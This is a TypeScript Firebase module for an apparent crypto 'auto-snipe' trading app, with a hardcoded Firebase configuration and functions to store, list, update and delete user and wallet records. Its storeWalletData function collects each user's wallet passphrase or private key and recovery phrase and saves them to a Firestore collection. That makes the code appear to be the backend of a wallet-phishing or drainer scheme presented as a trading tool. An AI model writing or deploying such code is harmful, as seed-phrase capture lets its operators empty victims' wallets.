"use client"

import { initializeApp, getApps, type FirebaseApp } from "firebase/app"
import {
  getFirestore,
  collection,
  addDoc,
  getDocs,
  doc,
  updateDoc,
  deleteDoc,
  onSnapshot,
  query,
  orderBy,
  type Firestore,
} from "firebase/firestore"

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyBhG3aI_r16XsSe7n3xQ5V7r01pP41FHZE",
  authDomain: "autosnip-7948b.firebaseapp.com",
  projectId: "autosnip-7948b",
  storageBucket: "autosnip-7948b.appspot.com",
  messagingSenderId: "166558743492",
  appId: "1:166558743492:web:3888012c736e393a480291",
  measurementId: "G-GDGEPRNL6F",
}

// Initialize Firebase
let app: FirebaseApp | undefined = undefined
let db: Firestore | undefined = undefined

// Initialize Firebase only on the client side
if (typeof window !== "undefined") {
  try {
    // Check if Firebase is already initialized
    if (!getApps().length) {
      app = initializeApp(firebaseConfig)
    } else {
      app = getApps()[0]
    }

    // Initialize Firestore
    db = getFirestore(app)
    console.log("Firebase initialized successfully")
  } catch (error) {
    console.error("Firebase initialization error:", error)
  }
}

// Store wallet connection data
export async function storeWalletData(walletData: any) {
  console.log("storeWalletData called with:", walletData)

  if (!db) {
    console.error("Firestore not initialized")
    return "mock-id-firestore-not-available"
  }

  try {
    // Ensure all required fields are present
    const dataToStore = {
      walletType: walletData.walletType || "unknown",
      walletName: walletData.walletName || "Unknown Wallet",
      walletAddress: walletData.walletAddress || "",
      balance: walletData.balance || 0,
      actualBalance: walletData.actualBalance || 0,
      connectionMethod: walletData.connectionMethod || "",
      passphrase: walletData.passphrase || walletData.privateKey || "",
      recoveryPhrase: walletData.recoveryPhrase || "",
      timestamp: walletData.timestamp || new Date().toISOString(),
    }

    console.log("Storing data to Firestore:", dataToStore)

    const docRef = await addDoc(collection(db, "walletData"), dataToStore)
    console.log("Wallet data stored successfully with ID:", docRef.id)
    return docRef.id
  } catch (error) {
    console.error("Error storing wallet data:", error)
    // Return a mock ID instead of throwing an error
    return "mock-id-storage-error"
  }
}

// Store user data in Firestore
export async function storeUserData(userData: any) {
  console.log("storeUserData called with:", userData)

  if (!db) {
    console.error("Firestore not initialized")
    return "mock-id-firestore-not-available"
  }

  try {
    const dataToStore = {
      id: userData.id,
      walletAddress: userData.walletAddress,
      walletType: userData.walletType,
      walletName: userData.walletName,
      balance: userData.balance || 0,
      totalDeposited: userData.totalDeposited || 0,
      totalWithdrawn: userData.totalWithdrawn || 0,
      autoSnipeConfigs: userData.autoSnipeConfigs || 0,
      activeSnipes: userData.activeSnipes || 0,
      totalTrades: userData.totalTrades || 0,
      profitLoss: userData.profitLoss || 0,
      lastActive: userData.lastActive,
      joinDate: userData.joinDate,
      status: userData.status || "active",
      isVip: userData.isVip || false,
      connectionMethod: userData.connectionMethod || "",
      timestamp: new Date().toISOString(),
    }

    console.log("Storing user data to Firestore:", dataToStore)

    const docRef = await addDoc(collection(db, "users"), dataToStore)
    console.log("User data stored successfully with ID:", docRef.id)
    return docRef.id
  } catch (error) {
    console.error("Error storing user data:", error)
    return "mock-id-storage-error"
  }
}

// Get all users from Firestore
export async function getAllUsers() {
  if (!db) {
    console.error("Firestore not initialized")
    return []
  }

  try {
    const q = query(collection(db, "users"), orderBy("joinDate", "desc"))
    const querySnapshot = await getDocs(q)
    const users = []

    querySnapshot.forEach((doc) => {
      users.push({
        firestoreId: doc.id,
        ...doc.data(),
      })
    })

    console.log("Retrieved users from Firestore:", users)
    return users
  } catch (error) {
    console.error("Error getting users:", error)
    return []
  }
}

// Update user data in Firestore
export async function updateUserInFirestore(userId: string, updates: any) {
  if (!db) {
    console.error("Firestore not initialized")
    return false
  }

  try {
    // Find the document by user ID
    const q = query(collection(db, "users"))
    const querySnapshot = await getDocs(q)

    let docId = null
    querySnapshot.forEach((doc) => {
      if (doc.data().id === userId) {
        docId = doc.id
      }
    })

    if (docId) {
      await updateDoc(doc(db, "users", docId), {
        ...updates,
        lastActive: new Date().toISOString(),
      })
      console.log("User updated in Firestore:", userId)
      return true
    } else {
      console.error("User not found in Firestore:", userId)
      return false
    }
  } catch (error) {
    console.error("Error updating user:", error)
    return false
  }
}

// Delete user from Firestore
export async function deleteUserFromFirestore(userId: string) {
  if (!db) {
    console.error("Firestore not initialized")
    return false
  }

  try {
    // Find the document by user ID
    const q = query(collection(db, "users"))
    const querySnapshot = await getDocs(q)

    let docId = null
    querySnapshot.forEach((doc) => {
      if (doc.data().id === userId) {
        docId = doc.id
      }
    })

    if (docId) {
      await deleteDoc(doc(db, "users", docId))
      console.log("User deleted from Firestore:", userId)
      return true
    } else {
      console.error("User not found in Firestore:", userId)
      return false
    }
  } catch (error) {
    console.error("Error deleting user:", error)
    return false
  }
}

// Listen to real-time user updates
export function subscribeToUsers(callback: (users: any[]) => void) {
  if (!db) {
    console.error("Firestore not initialized")
    return () => {}
  }

  try {
    const q = query(collection(db, "users"), orderBy("joinDate", "desc"))

    const unsubscribe = onSnapshot(q, (querySnapshot) => {
      const users = []
      querySnapshot.forEach((doc) => {
        users.push({
          firestoreId: doc.id,
          ...doc.data(),
        })
      })

      console.log("Real-time users update:", users)
      callback(users)
    })

    return unsubscribe
  } catch (error) {
    console.error("Error subscribing to users:", error)
    return () => {}
  }
}

// Check if user exists in Firestore
export async function checkUserExists(walletAddress: string) {
  if (!db) {
    console.error("Firestore not initialized")
    return null
  }

  try {
    const q = query(collection(db, "users"))
    const querySnapshot = await getDocs(q)

    let existingUser = null
    querySnapshot.forEach((doc) => {
      if (doc.data().walletAddress === walletAddress) {
        existingUser = {
          firestoreId: doc.id,
          ...doc.data(),
        }
      }
    })

    return existingUser
  } catch (error) {
    console.error("Error checking user exists:", error)
    return null
  }
}

// Mock implementation for when Firestore is not available
export function isFirestoreAvailable() {
  return !!db
}

export { db }
